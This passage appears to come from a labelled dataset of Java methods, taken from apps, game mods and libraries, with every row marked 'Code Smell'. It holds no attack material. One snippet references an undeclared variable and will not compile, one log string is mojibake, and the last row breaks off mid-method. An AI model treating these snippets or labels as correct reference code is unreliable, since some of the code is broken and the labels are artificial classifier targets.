"/** 
 * 更新提示信息
 * @param tips 提示信息
 */
private void updateTips(List<TipInfo> tips){
  mTips=tips;
  if (mTips != null && mTips.size() > 0 && mTvContent != null) {
    mIndex=0;
    showRichText(mTips.get(mIndex));
  }
}",1,Code Smell
"@Override public void visitAnyProperty(Clazz clazz,KotlinDeclarationContainerMetadata kotlinDeclarationContainerMetadata,KotlinPropertyMetadata kotlinPropertyMetadata){
  if ((kotlinPropertyMetadata.referencedBackingField != null && (kotlinPropertyMetadata.referencedBackingField.getProcessingFlags() & ProcessingFlags.DONT_OBFUSCATE) != 0) || (kotlinPropertyMetadata.referencedGetterMethod != null && (kotlinPropertyMetadata.referencedGetterMethod.getProcessingFlags() & ProcessingFlags.DONT_OBFUSCATE) != 0) || (kotlinPropertyMetadata.referencedSetterMethod != null && (kotlinPropertyMetadata.referencedSetterMethod.getProcessingFlags() & ProcessingFlags.DONT_OBFUSCATE) != 0)) {
    return;
  }
  kotlinPropertyMetadata.setProcessingInfo(nameFactory.nextName());
}",1,Code Smell
"protected final void freeMemoryBlock(Pointer pointer){
  if (this.memoryBlock != null && (pointer == null || this.memoryBlock.isSame(pointer))) {
    this.memoryBlock.free();
    this.memoryBlock=null;
  }
}
",1,Code Smell
"@Override public <T>ReadWriteSpan setAttribute(AttributeKey<T> key,T value){
  if (key == null || key.getKey().isEmpty() || value == null) {
    return this;
  }
synchronized (lock) {
    if (!isModifiableByCurrentThread()) {
      logger.log(Level.FINE,""Calling setAttribute() on an ended Span."");
      return this;
    }
    if (attributes == null) {
      attributes=AttributesMap.create(spanLimits.getMaxNumberOfAttributes(),spanLimits.getMaxAttributeValueLength());
    }
    attributes.put(key,value);
  }
  return this;
}
",1,Code Smell
"@Override public AppConn getAppConn(String appConnName,String spi,String homePath) throws Exception {
  ClassLoader currentClassLoader=Thread.currentThread().getContextClassLoader();
  String libPathUrl;
  if (StringUtils.isNotEmpty(homePath)) {
    libPathUrl=new File(homePath,LIB_NAME).getPath();
  }
 else {
    libPathUrl=Paths.get(AppConnUtils.getAppConnHomePath(),appConnName,LIB_NAME).toFile().getPath();
  }
  LOGGER.info(""The libPath url of AppConn {} is {}."",appConnName,libPathUrl);
  List<URL> jars=AppConnUtils.getJarsUrlsOfPath(libPathUrl);
  ClassLoader classLoader=AppStandardClassUtils.refreshClassloader(appConnName,() -> new AppConnClassLoader(jars.toArray(new URL[1]),currentClassLoader));
  Thread.currentThread().setContextClassLoader(classLoader);
  String fullClassName;
  if (StringUtils.isEmpty(spi)) {
    try {
      fullClassName=AppConnUtils.getAppConnClassName(appConnName,libPathUrl,classLoader);
    }
 catch (    NoSuchAppConnException e) {
      Thread.currentThread().setContextClassLoader(currentClassLoader);
      throw e;
    }
  }
 else {
    fullClassName=spi;
  }
  Class<?> clazz=null;
  try {
    clazz=classLoader.loadClass(fullClassName);
  }
 catch (  ClassNotFoundException e) {
    Thread.currentThread().setContextClassLoader(currentClassLoader);
    DSSExceptionUtils.dealErrorException(70062,fullClassName + "" class not found "",e,ErrorException.class);
  }
  AppConn retAppConn=(AppConn)clazz.newInstance();
  File appConnPropertiesPathUrl;
  if (StringUtils.isNotEmpty(homePath)) {
    appConnPropertiesPathUrl=new File(homePath,APP_CONN_PROPERTIES_NAME);
  }
 else {
    appConnPropertiesPathUrl=Paths.get(AppConnUtils.getAppConnHomePath(),appConnName,APP_CONN_PROPERTIES_NAME).toFile();
  }
  if (appConnPropertiesPathUrl.exists() && appConnPropertiesPathUrl.isFile()) {
    Properties properties=new Properties();
    properties.load(FileUtils.openInputStream(appConnPropertiesPathUrl));
    if (!properties.isEmpty()) {
      LOGGER.info(""AppConn {} try to load {}, the properties is {}."",appConnName,APP_CONN_PROPERTIES_NAME,properties);
      properties.forEach((key,value) -> {
        if (key != null && StringUtils.isNotBlank((String)key) && value != null && StringUtils.isNotBlank((String)value)) {
          BDPConfiguration.setIfNotExists((String)key,(String)value);
        }
      }
);
    }
  }
  Thread.currentThread().setContextClassLoader(currentClassLoader);
  LOGGER.info(""Loaded appConn {} with class {}."",appConnName,retAppConn.getClass().getName());
  return retAppConn;
}",1,Code Smell
"/** 
 * Layout suggestions to the suggestions strip. And returns the start index of more suggestions.
 * @param suggestedWords suggestions to be shown in the suggestions strip.
 * @param stripView the suggestions strip view.
 * @param placerView the view where the debug info will be placed.
 * @return the start index of more suggestions.
 */
public int layoutAndReturnStartIndexOfMoreSuggestions(final Context context,final SuggestedWords suggestedWords,final ViewGroup stripView,final ViewGroup placerView){
  if (suggestedWords.isPunctuationSuggestions()) {
    return layoutPunctuationsAndReturnStartIndexOfMoreSuggestions((PunctuationSuggestions)suggestedWords,stripView);
  }
  final int wordCountToShow=suggestedWords.getWordCountToShow();
  final int startIndexOfMoreSuggestions=setupWordViewsAndReturnStartIndexOfMoreSuggestions(suggestedWords,mSuggestionsCountInStrip);
  final TextView centerWordView=mWordViews.get(mCenterPositionInStrip);
  final int stripWidth=stripView.getWidth();
  final int centerWidth=getSuggestionWidth(mCenterPositionInStrip,stripWidth);
  if (wordCountToShow == 1 || getTextScaleX(centerWordView.getText(),centerWidth,centerWordView.getPaint()) < MIN_TEXT_XSCALE) {
    final int countInStrip=1;
    mMoreSuggestionsAvailable=(wordCountToShow > countInStrip);
    layoutWord(context,mCenterPositionInStrip,stripWidth - mPadding);
    stripView.addView(centerWordView);
    setLayoutWeight(centerWordView,1.0f,ViewGroup.LayoutParams.MATCH_PARENT);
    if (SuggestionStripView.DEBUG_SUGGESTIONS) {
      layoutDebugInfo(mCenterPositionInStrip,placerView,stripWidth);
    }
    final Integer lastIndex=(Integer)centerWordView.getTag();
    return (lastIndex == null ? 0 : lastIndex) + 1;
  }
  final int countInStrip=mSuggestionsCountInStrip;
  mMoreSuggestionsAvailable=(wordCountToShow > countInStrip);
  @SuppressWarnings(""unused"") int x=0;
  for (int positionInStrip=0; positionInStrip < countInStrip; positionInStrip++) {
    if (positionInStrip != 0) {
      final View divider=mDividerViews.get(positionInStrip);
      addDivider(stripView,divider);
      x+=divider.getMeasuredWidth();
    }
    final int width=getSuggestionWidth(positionInStrip,stripWidth);
    final TextView wordView=layoutWord(context,positionInStrip,width);
    stripView.addView(wordView);
    setLayoutWeight(wordView,getSuggestionWeight(positionInStrip),ViewGroup.LayoutParams.MATCH_PARENT);
    x+=wordView.getMeasuredWidth();
    if (SuggestionStripView.DEBUG_SUGGESTIONS) {
      layoutDebugInfo(positionInStrip,placerView,x);
    }
  }
  return startIndexOfMoreSuggestions;
}",1,Code Smell
"public static String getGroupConversationAvatar(String groupId){
  final String savedIcon=SPUtils.getInstance(TUILogin.getSdkAppId() + SP_IMAGE).getString(groupId);
  if (!TextUtils.isEmpty(savedIcon) && new File(savedIcon).isFile() && new File(savedIcon).exists()) {
    return savedIcon;
  }
  return """";
}
",1,Code Smell
"@Override @PostConstruct public void initLocalCache(){
  TenantUtils.executeIgnore(() -> {
    List<MpAccountDO> accounts=Collections.emptyList();
    try {
      accounts=mpAccountMapper.selectList();
    }
 catch (    Throwable ex) {
      if (!ex.getMessage().contains(""doesn't exist"")) {
        throw ex;
      }
      log.error(""[寰俊鍏紬鍙 yudao-module-mp - 琛ㄧ粨鏋勬湭瀵煎叆][鍙傝 https://doc.iocoder.cn/mp/build/ 寮鍚痌"");
    }
    log.info(""[initLocalCacheIfUpdate][缂撳瓨鍏紬鍙疯处鍙凤紝鏁伴噺涓:{}]"",accounts.size());
    mpServiceFactory.init(accounts);
    accountCache=convertMap(accounts,MpAccountDO::getAppId);
  }
);
}
",1,Code Smell
"public void loadRecentKeys(final Collection<DynamicGridKeyboard> keyboards){
  final String str=Settings.readEmojiRecentKeys(mPrefs);
  final List<Object> keys=JsonUtils.jsonStrToList(str);
  for (  final Object o : keys) {
    final Key key;
    if (o instanceof Integer) {
      final int code=(Integer)o;
      key=getKeyByCode(keyboards,code);
    }
 else     if (o instanceof String) {
      key=getKeyByOutputText(keyboards,outputText);
    }
 else {
      Log.w(TAG,""Invalid object: "" + o);
      continue;
    }
    addKeyLast(key);
  }
}
",1,Code Smell
"public Object resolveArgument(MethodParameter parameter,ModelAndViewContainer mavContainer,NativeWebRequest webRequest,WebDataBinderFactory binderFactory){
  if (parameter.getParameterAnnotation(TokenToAdminUser.class) instanceof TokenToAdminUser) {
    String token=webRequest.getHeader(""token"");
    if (null != token && !"""".equals(token) && token.length() == Constants.TOKEN_LENGTH) {
      AdminUserToken adminUserToken=newBeeAdminUserTokenMapper.selectByToken(token);
      if (adminUserToken == null) {
        NewBeeMallException.fail(ServiceResultEnum.ADMIN_NOT_LOGIN_ERROR.getResult());
      }
 else       if (adminUserToken.getExpireTime().getTime() <= System.currentTimeMillis()) {
        NewBeeMallException.fail(ServiceResultEnum.ADMIN_TOKEN_EXPIRE_ERROR.getResult());
      }
      return adminUserToken;
    }
 else {
      NewBeeMallException.fail(ServiceResultEnum.ADMIN_NOT_LOGIN_ERROR.getResult());
    }
  }
  return null;
}
",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite private void checkPressed(Level worldIn,BlockPos pos){
  BlockState blockstate=worldIn.getBlockState(pos);
  boolean flag=blockstate.getValue(POWERED);
  boolean flag1=false;
  List<? extends Entity> list=worldIn.getEntities(null,blockstate.getShape(worldIn,pos).bounds().move(pos));
  if (!list.isEmpty()) {
    for (    Entity entity : list) {
      if (!entity.isIgnoringBlockTriggers()) {
        flag1=true;
        break;
      }
    }
  }
  if (flag != flag1 && flag1 && blockstate.getValue(TripWireBlock.ATTACHED)) {
    org.bukkit.block.Block block=CraftBlock.at(worldIn,pos);
    boolean allowed=false;
    for (    Object object : list) {
      if (object != null) {
        Cancellable cancellable;
        if (object instanceof Player) {
          cancellable=CraftEventFactory.callPlayerInteractEvent((Player)object,Action.PHYSICAL,pos,null,null,null);
        }
 else         if (object instanceof Entity) {
          cancellable=new EntityInteractEvent(((EntityBridge)object).bridge$getBukkitEntity(),block);
          Bukkit.getPluginManager().callEvent((EntityInteractEvent)cancellable);
        }
 else {
          continue;
        }
        if (!cancellable.isCancelled()) {
          allowed=true;
          break;
        }
      }
    }
    if (!allowed) {
      return;
    }
  }
  if (flag1 != flag) {
    blockstate=blockstate.setValue(POWERED,flag1);
    worldIn.setBlock(pos,blockstate,3);
    this.updateSource(worldIn,pos,blockstate);
  }
  if (flag1) {
    worldIn.scheduleTick(new BlockPos(pos),(Block)(Object)this,10);
  }
}",1,Code Smell
"@SuppressLint(""RestrictedApi"") private String createNotificationShortcut(NotificationCompat.Builder builder,long did,String name,TLRPC.User user,TLRPC.Chat chat,Person person){
  if (unsupportedNotificationShortcut() || ChatObject.isChannel(chat) && !chat.megagroup) {
    return null;
  }
  try {
    String id=""ndid_"" + did;
    Intent shortcutIntent=new Intent(ApplicationLoader.applicationContext,OpenChatReceiver.class);
    shortcutIntent.setAction(""com.tmessages.openchat"" + Math.random() + Integer.MAX_VALUE);
    if (did > 0) {
      shortcutIntent.putExtra(""userId"",did);
    }
 else {
      shortcutIntent.putExtra(""chatId"",-did);
    }
    ShortcutInfoCompat.Builder shortcutBuilder=new ShortcutInfoCompat.Builder(ApplicationLoader.applicationContext,id).setShortLabel(chat != null ? name : UserObject.getFirstName(user)).setLongLabel(name).setIntent(new Intent(Intent.ACTION_DEFAULT)).setIntent(shortcutIntent).setLongLived(true).setLocusId(new LocusIdCompat(id));
    Bitmap avatar=null;
    if (person != null) {
      shortcutBuilder.setPerson(person);
      shortcutBuilder.setIcon(person.getIcon());
      if (person.getIcon() != null) {
        avatar=person.getIcon().getBitmap();
      }
    }
    ShortcutInfoCompat shortcut=shortcutBuilder.build();
    ShortcutManagerCompat.pushDynamicShortcut(ApplicationLoader.applicationContext,shortcut);
    builder.setShortcutInfo(shortcut);
    Intent intent=new Intent(ApplicationLoader.applicationContext,BubbleActivity.class);
    intent.setAction(""com.tmessages.openchat"" + Math.random() + Integer.MAX_VALUE);
    if (DialogObject.isUserDialog(did)) {
      intent.putExtra(""userId"",did);
    }
 else {
      intent.putExtra(""chatId"",-did);
    }
    intent.putExtra(""currentAccount"",currentAccount);
    IconCompat icon;
    if (avatar != null) {
      icon=IconCompat.createWithAdaptiveBitmap(avatar);
    }
 else     if (user != null) {
      icon=IconCompat.createWithResource(ApplicationLoader.applicationContext,user.bot ? R.drawable.book_bot : R.drawable.book_user);
    }
 else {
      icon=IconCompat.createWithResource(ApplicationLoader.applicationContext,R.drawable.book_group);
    }
    if (!NekoConfig.disableNotificationBubbles.Bool()) {
      NotificationCompat.BubbleMetadata.Builder bubbleBuilder=new NotificationCompat.BubbleMetadata.Builder(PendingIntent.getActivity(ApplicationLoader.applicationContext,0,intent,PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE),icon);
      bubbleBuilder.setSuppressNotification(openedDialogId == did);
      bubbleBuilder.setAutoExpandBubble(false);
      bubbleBuilder.setDesiredHeight(AndroidUtilities.dp(640));
      builder.setBubbleMetadata(bubbleBuilder.build());
    }
    return id;
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return null;
}",1,Code Smell
"/** 
 * Updates the entity, called every tick. <p> Ignored if  {@link #getInstance()} returns null.
 * @param time the update time in milliseconds
 */
@Override public void tick(long time){
  if (instance == null || isRemoved() || !ChunkUtils.isLoaded(currentChunk))   return;
  this.scheduler.processTick();
  if (isRemoved())   return;
{
    movementTick();
    touchTick();
    update(time);
    ticks++;
    EventDispatcher.call(new EntityTickEvent(this));
    effectTick();
  }
  if (vehicle == null && ticks >= nextSynchronizationTick) {
    synchronizePosition();
    sendPacketToViewers(getVelocityPacket());
  }
  this.scheduler.processTickEnd();
}
",1,Code Smell
"public String toString(){
  String string=getName();
  if (filter != null || apkFilter != null || aabFilter != null || jarFilter != null || aarFilter != null || warFilter != null || earFilter != null || jmodFilter != null || zipFilter != null) {
    string+=ConfigurationConstants.OPEN_ARGUMENTS_KEYWORD + (aarFilter != null ? ListUtil.commaSeparatedString(aarFilter,true) : """") + ConfigurationConstants.SEPARATOR_KEYWORD+ (aabFilter != null ? ListUtil.commaSeparatedString(aabFilter,true) : """")+ ConfigurationConstants.SEPARATOR_KEYWORD+ (apkFilter != null ? ListUtil.commaSeparatedString(apkFilter,true) : """")+ ConfigurationConstants.SEPARATOR_KEYWORD+ (zipFilter != null ? ListUtil.commaSeparatedString(zipFilter,true) : """")+ ConfigurationConstants.SEPARATOR_KEYWORD+ (jmodFilter != null ? ListUtil.commaSeparatedString(jmodFilter,true) : """")+ ConfigurationConstants.SEPARATOR_KEYWORD+ (earFilter != null ? ListUtil.commaSeparatedString(earFilter,true) : """")+ ConfigurationConstants.SEPARATOR_KEYWORD+ (warFilter != null ? ListUtil.commaSeparatedString(warFilter,true) : """")+ ConfigurationConstants.SEPARATOR_KEYWORD+ (jarFilter != null ? ListUtil.commaSeparatedString(jarFilter,true) : """")+ ConfigurationConstants.SEPARATOR_KEYWORD+ (filter != null ? ListUtil.commaSeparatedString(filter,true) : """")+ ConfigurationConstants.CLOSE_ARGUMENTS_KEYWORD;
  }
  return string;
}
",1,Code Smell
"private static Runnable unwrap(Runnable runnable){
  if (outcomeTrackingRunnableClass != null && outcomeTrackingRunnableField != null && outcomeTrackingRunnableClass.isAssignableFrom(runnable.getClass())) {
    try {
      return unwrap((Runnable)outcomeTrackingRunnableField.get(runnable));
    }
 catch (    IllegalAccessException ignore) {
    }
  }
  return runnable;
}
",1,Code Smell
"public void onLongPressed(){
  sTimerProxy.cancelLongPressTimersOf(this);
  if (isShowingMoreKeysPanel()) {
    return;
  }
  if (mCursorMoved) {
    return;
  }
  final Key key=getKey();
  if (key == null) {
    return;
  }
  if (key.hasNoPanelAutoMoreKey()) {
    cancelKeyTracking();
    final int moreKeyCode=key.getMoreKeys()[0].mCode;
    sListener.onPressKey(moreKeyCode,0,true);
    sListener.onCodeInput(moreKeyCode,Constants.NOT_A_COORDINATE,Constants.NOT_A_COORDINATE,false);
    sListener.onReleaseKey(moreKeyCode,false);
    return;
  }
  final int code=key.getCode();
  if (code == Constants.CODE_SPACE && Settings.getInstance().getCurrent().mSpaceForLangChange || code == Constants.CODE_LANGUAGE_SWITCH) {
    if (sListener.onCustomRequest(Constants.CUSTOM_CODE_SHOW_INPUT_METHOD_PICKER)) {
      cancelKeyTracking();
      sListener.onReleaseKey(code,false);
      return;
    }
  }
  setReleasedKeyGraphics(key,false);
  final MoreKeysPanel moreKeysPanel=sDrawingProxy.showMoreKeysKeyboard(key,this);
  if (moreKeysPanel == null) {
    return;
  }
  final int translatedX=moreKeysPanel.translateX(mLastX);
  final int translatedY=moreKeysPanel.translateY(mLastY);
  moreKeysPanel.onDownEvent(translatedX,translatedY,mPointerId,SystemClock.uptimeMillis());
  mMoreKeysPanel=moreKeysPanel;
}",1,Code Smell
"private void pushInstance(@NonNull Scene scene,@Nullable PushOptions pushOptions){
  ThreadUtility.checkUIThread();
  if (!Utility.isActivityStatusValid(getActivity())) {
    return;
  }
  if (scene.getParentScene() != null) {
    if (scene.getParentScene() == this) {
      throw new IllegalArgumentException(""Scene is already pushed"");
    }
    throw new IllegalArgumentException(""Scene already has a parent, parent "" + scene.getParentScene());
  }
  if (isSupportRestore() && scene.isSceneRestoreEnabled() && !SceneInstanceUtility.isConstructorMethodSupportRestore(scene)) {
    throw new IllegalArgumentException(""Scene "" + scene.getClass().getName() + "" must be a public class or public static class, ""+ ""and have only one parameterless constructor to be properly recreated from instance state."");
  }
  if (pushOptions == null) {
    pushOptions=new PushOptions.Builder().build();
  }
  hideSoftInputIfNeeded();
  mNavigationSceneManager.push(scene,pushOptions);
}
",1,Code Smell
"private List<WorkUserStatsVO> memberTaskStatistics(Integer workId){
  List<WorkUserStatsVO> list=new ArrayList<>();
  Work work=getById(workId);
  if (work.getIsOpen() == 1) {
    List<SimpleUser> simpleUserList=UserCacheUtil.getSimpleUsers(workTaskService.lambdaQuery().eq(WorkTask::getIshidden,0).eq(WorkTask::getWorkId,workId).list().stream().map(WorkTask::getMainUserId).collect(Collectors.toList()));
    for (    SimpleUser simpleUser : simpleUserList) {
      list.add(BeanUtil.copyProperties(simpleUser,WorkUserStatsVO.class));
    }
    ;
    list.forEach(userStatsVO -> {
      WorkTaskStatsVO first=getBaseMapper().workStatistics(workId,null,null,userStatsVO.getUserId());
      BeanUtil.copyProperties(first,userStatsVO);
    }
);
  }
 else {
    String ownerUserIds=getOne(new QueryWrapper<Work>().select(""owner_user_id"").eq(""work_id"",workId)).getOwnerUserId();
    if (StrUtil.isEmpty(ownerUserIds)) {
      return list;
    }
    for (    String userId : ownerUserIds.split("","")) {
      if (StrUtil.isEmpty(userId)) {
        continue;
      }
      SimpleUser user=UserCacheUtil.getSimpleUser(Long.valueOf(userId));
      WorkTaskStatsVO first=getBaseMapper().workStatistics(workId,null,Long.parseLong(userId),null);
      WorkUserStatsVO workUserStatsVO=BeanUtil.copyProperties(first,WorkUserStatsVO.class);
      workUserStatsVO.setRealname(user.getRealname());
      workUserStatsVO.setImg(user.getImg());
      workUserStatsVO.setUserId(user.getUserId());
      list.add(workUserStatsVO);
    }
  }
  return list;
}",1,Code Smell
"private Download putDownload(Download download){
  Assertions.checkState(download.state != STATE_COMPLETED && download.state != STATE_FAILED);
  int changedIndex=getDownloadIndex(download.request.id);
  if (changedIndex == C.INDEX_UNSET) {
    downloads.add(download);
    Collections.sort(downloads,InternalHandler::compareStartTimes);
  }
 else {
    boolean needsSort=download.startTimeMs != downloads.get(changedIndex).startTimeMs;
    downloads.set(changedIndex,download);
    if (needsSort) {
      Collections.sort(downloads,InternalHandler::compareStartTimes);
    }
  }
  try {
    downloadIndex.putDownload(download);
  }
 catch (  IOException e) {
    Log.e(TAG,""Failed to update index."",e);
  }
  DownloadUpdate update=new DownloadUpdate(download,false,new ArrayList<>(downloads));
  mainHandler.obtainMessage(MSG_DOWNLOAD_UPDATE,update).sendToTarget();
  return download;
}
",1,Code Smell
"private void addChildWallets(Wallet wallet,PaymentCode externalPaymentCode,Transaction transaction,PayNym payNym){
  List<Wallet> addedWallets=addChildWallets(externalPaymentCode,payNym);
  Wallet masterWallet=getWalletForm().getMasterWallet();
  Storage storage=AppServices.get().getOpenWallets().get(masterWallet);
  EventManager.get().post(new ChildWalletsAddedEvent(storage,masterWallet,addedWallets));
  BlockTransaction blockTransaction=wallet.getWalletTransaction(transaction.getTxId());
  if (blockTransaction != null && blockTransaction.getLabel() == null) {
    blockTransaction.setLabel(""Link "" + (payNym == null ? externalPaymentCode.toAbbreviatedString() : payNym.nymName()));
    TransactionEntry transactionEntry=new TransactionEntry(wallet,blockTransaction,Collections.emptyMap(),Collections.emptyMap());
    EventManager.get().post(new WalletEntryLabelsChangedEvent(wallet,List.of(transactionEntry)));
  }
  if (paymentTabs.getTabs().size() > 0 && !addedWallets.isEmpty()) {
    Wallet addedWallet=addedWallets.stream().filter(w -> w.getScriptType() == ScriptType.P2WPKH).findFirst().orElse(addedWallets.iterator().next());
    PaymentController controller=(PaymentController)paymentTabs.getTabs().get(0).getUserData();
    controller.setPayNym(payNym == null ? PayNym.fromWallet(addedWallet) : payNym);
  }
  Glyph successGlyph=new Glyph(FontAwesome5.FONT_NAME,FontAwesome5.Glyph.CHECK_CIRCLE);
  successGlyph.getStyleClass().add(""success"");
  successGlyph.setFontSize(50);
  AppServices.showAlertDialog(""Notification Successful"",""The notification transaction was successfully sent for payment code "" + externalPaymentCode.toAbbreviatedString() + (payNym == null ? """" : "" ("" + payNym.nymName() + "")"")+ "".\n\nYou can send to it by entering the payment code, or selecting `PayNym or Payment code` in the Pay to dropdown."",Alert.AlertType.INFORMATION,successGlyph,ButtonType.OK);
}
public List<Wallet> addChildWallets(PaymentCode externalPaymentCode,PayNym payNym){
  List<Wallet> addedWallets=new ArrayList<>();
  Wallet masterWallet=getWalletForm().getMasterWallet();
  Storage storage=AppServices.get().getOpenWallets().get(masterWallet);
  List<ScriptType> scriptTypes=PayNym.getSegwitScriptTypes();
  for (  ScriptType childScriptType : scriptTypes) {
    String label=(payNym == null ? externalPaymentCode.toAbbreviatedString() : payNym.nymName()) + "" "" + childScriptType.getName();
    Wallet addedWallet=masterWallet.addChildWallet(externalPaymentCode,childScriptType,label);
    if (!storage.isPersisted(addedWallet)) {
      try {
        storage.saveWallet(addedWallet);
        EventManager.get().post(new NewChildWalletSavedEvent(storage,masterWallet,addedWallet));
      }
 catch (      Exception e) {
        log.error(""Error saving wallet"",e);
        AppServices.showErrorDialog(""Error saving wallet "" + addedWallet.getName(),e.getMessage());
      }
    }
    addedWallets.add(addedWallet);
  }
  return addedWallets;
}",1,Code Smell
"/** 
 * Called during  {@link FMLPreInitializationEvent}.
 */
public void preInit(){
  if (!OPENGL_45) {
    unsupported(""Your system does not support OpenGL 4.5!\nRequired by FarPlaneTwo."");
  }
  int size=glGetInteger(GL_MAX_SHADER_STORAGE_BLOCK_SIZE);
  FP2_LOG.info(PStrings.fastFormat(""Max SSBO size: %d bytes (%.2f MiB)"",size,size / (1024.0d * 1024.0d)));
  if (!MC.getFramebuffer().isStencilEnabled() && !MC.getFramebuffer().enableStencil()) {
    if (OF && (PUnsafe.getBoolean(MC.gameSettings,OF_FASTRENDER_OFFSET) || PUnsafe.getInt(MC.gameSettings,OF_AALEVEL_OFFSET) > 0)) {
      unsupported(""FarPlaneTwo was unable to enable the OpenGL stencil buffer!\n"" + ""Please launch the game without FarPlaneTwo and disable\n"" + ""  OptiFine's \""Fast Render\"" and \""Antialiasing\"", then\n""+ ""  try again."");
    }
 else {
      unsupported(""Unable to enable the OpenGL stencil buffer!\nRequired by FarPlaneTwo."");
    }
  }
  ClientEvents.register();
  ConfigListenerManager.add(() -> PROTOCOL_FP2.sendToServer(new CPacketClientConfig().config(FP2Config.global())));
}",1,Code Smell
"@Subscribe public void blockTransactionFetched(BlockTransactionFetchedEvent event){
  if (event.getTxId().equals(getTransaction().getTxId()) && !event.getInputTransactions().isEmpty()) {
    if (event.getBlockTransaction() != null && (!Sha256Hash.ZERO_HASH.equals(event.getBlockTransaction().getBlockHash()) || txdata.getBlockTransaction() == null)) {
      txdata.setBlockTransaction(event.getBlockTransaction());
    }
    if (txdata.getInputTransactions() == null) {
      txdata.setInputTransactions(event.getInputTransactions());
    }
 else {
      txdata.getInputTransactions().putAll(event.getInputTransactions());
    }
    txdata.updateInputsFetchedRange(event.getPageStart(),event.getPageEnd());
  }
}",1,Code Smell
"public static void onActivityResume(Activity activity){
  if (runningDialogList != null) {
    CopyOnWriteArrayList<BaseDialog> copyOnWriteList=new CopyOnWriteArrayList<>(runningDialogList);
    for (int i=copyOnWriteList.size() - 1; i >= 0; i--) {
      BaseDialog baseDialog=copyOnWriteList.get(i);
      if (baseDialog.getOwnActivity() == activity && baseDialog.isShow && baseDialog.getDialogView() != null) {
        View boxRoot=baseDialog.getDialogView().findViewById(R.id.box_root);
        if (boxRoot instanceof DialogXBaseRelativeLayout) {
          if (((DialogXBaseRelativeLayout)boxRoot).isBaseFocusable()) {
            ((DialogXBaseRelativeLayout)boxRoot).requestFocusOnResume();
            return;
          }
        }
      }
    }
  }
}",1,Code Smell
"private LinkSpanDrawable checkTouchTextLayout(StaticLayout textLayout,int textX,int textY,int ex,int ey){
  try {
    int x=(int)(ex - textX);
    int y=(int)(ey - textY);
    final int line=textLayout.getLineForVertical(y);
    final int off=textLayout.getOffsetForHorizontal(line,x);
    final float left=textLayout.getLineLeft(line);
    if (left <= x && left + textLayout.getLineWidth(line) >= x && y >= 0 && y <= textLayout.getHeight()) {
      Spannable buffer=(Spannable)textLayout.getText();
      ClickableSpan[] link=buffer.getSpans(off,off,ClickableSpan.class);
      if (link.length != 0 && !AndroidUtilities.isAccessibilityScreenReaderEnabled()) {
        LinkSpanDrawable linkDrawable=new LinkSpanDrawable(link[0],parentFragment.getResourceProvider(),ex,ey);
        int start=buffer.getSpanStart(link[0]);
        int end=buffer.getSpanEnd(link[0]);
        LinkPath path=linkDrawable.obtainNewPath();
        path.setCurrentLayout(textLayout,start,pressedLinkYOffset=textY);
        textLayout.getSelectionPath(start,end,path);
        return linkDrawable;
      }
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return null;
}",1,Code Smell
"/** 
 * Try to split all chunks for evenly-sized table, or else return empty. <p>We can use evenly-sized chunks or unevenly-sized chunks when split table into chunks, using evenly-sized chunks which is much efficient, using unevenly-sized chunks which will request many queries and is not efficient.
 */
private Optional<List<MySqlSnapshotSplit>> trySplitAllEvenlySizedChunks(MySqlPartition partition,TableId tableId){
  LOG.debug(""Try evenly splitting table {} into chunks"",tableId);
  final Object min=minMaxOfSplitColumn[0];
  final Object max=minMaxOfSplitColumn[1];
  if (min == null || max == null || min.equals(max)) {
    return Optional.of(generateSplits(partition,tableId,Collections.singletonList(ChunkRange.all())));
  }
  final int chunkSize=sourceConfig.getSplitSize();
  final int dynamicChunkSize=getDynamicChunkSize(tableId,splitColumn,min,max,chunkSize,approximateRowCnt);
  if (dynamicChunkSize != -1) {
    LOG.debug(""finish evenly splitting table {} into chunks"",tableId);
    List<ChunkRange> chunks=splitEvenlySizedChunks(tableId,min,max,approximateRowCnt,chunkSize,dynamicChunkSize);
    return Optional.of(generateSplits(partition,tableId,chunks));
  }
 else {
    LOG.debug(""beginning unevenly splitting table {} into chunks"",tableId);
    return Optional.empty();
  }
}",1,Code Smell
"@Override public Cache getCache(String name){
  if (!TenantContextHolder.isIgnore() && TenantContextHolder.getTenantId() != null && !CollUtil.contains(ignoreCaches,name)) {
    name=name + "":"" + TenantContextHolder.getTenantId();
  }
  return super.getCache(name);
}
",1,Code Smell
"private static ArrowFieldWriter<ArrayData> createArrowFieldWriterForArray(ValueVector vector,LogicalType fieldType){
  if (vector instanceof TinyIntVector) {
    return TinyIntWriter.forArray((TinyIntVector)vector);
  }
 else   if (vector instanceof SmallIntVector) {
    return SmallIntWriter.forArray((SmallIntVector)vector);
  }
 else   if (vector instanceof IntVector) {
    return IntWriter.forArray((IntVector)vector);
  }
 else   if (vector instanceof BigIntVector) {
    return BigIntWriter.forArray((BigIntVector)vector);
  }
 else   if (vector instanceof BitVector) {
    return BooleanWriter.forArray((BitVector)vector);
  }
 else   if (vector instanceof Float4Vector) {
    return FloatWriter.forArray((Float4Vector)vector);
  }
 else   if (vector instanceof Float8Vector) {
    return DoubleWriter.forArray((Float8Vector)vector);
  }
 else   if (vector instanceof VarCharVector) {
    return VarCharWriter.forArray((VarCharVector)vector);
  }
 else   if (vector instanceof FixedSizeBinaryVector) {
    return BinaryWriter.forArray((FixedSizeBinaryVector)vector);
  }
 else   if (vector instanceof VarBinaryVector) {
    return VarBinaryWriter.forArray((VarBinaryVector)vector);
  }
 else   if (vector instanceof DecimalVector) {
    DecimalVector decimalVector=(DecimalVector)vector;
    return DecimalWriter.forArray(decimalVector,getPrecision(decimalVector),decimalVector.getScale());
  }
 else   if (vector instanceof DateDayVector) {
    return DateWriter.forArray((DateDayVector)vector);
  }
 else   if (vector instanceof TimeSecVector || vector instanceof TimeMilliVector || vector instanceof TimeMicroVector|| vector instanceof TimeNanoVector) {
    return TimeWriter.forArray(vector);
  }
 else   if (vector instanceof TimeStampVector && ((ArrowType.Timestamp)vector.getField().getType()).getTimezone().equals(""UTC"")) {
    int precision;
    if (fieldType instanceof LocalZonedTimestampType) {
      precision=((LocalZonedTimestampType)fieldType).getPrecision();
    }
 else {
      precision=((TimestampType)fieldType).getPrecision();
    }
    return TimestampWriter.forArray(vector,precision);
  }
 else   if (vector instanceof MapVector) {
    MapVector mapVector=(MapVector)vector;
    LogicalType keyType=((MapType)fieldType).getKeyType();
    LogicalType valueType=((MapType)fieldType).getValueType();
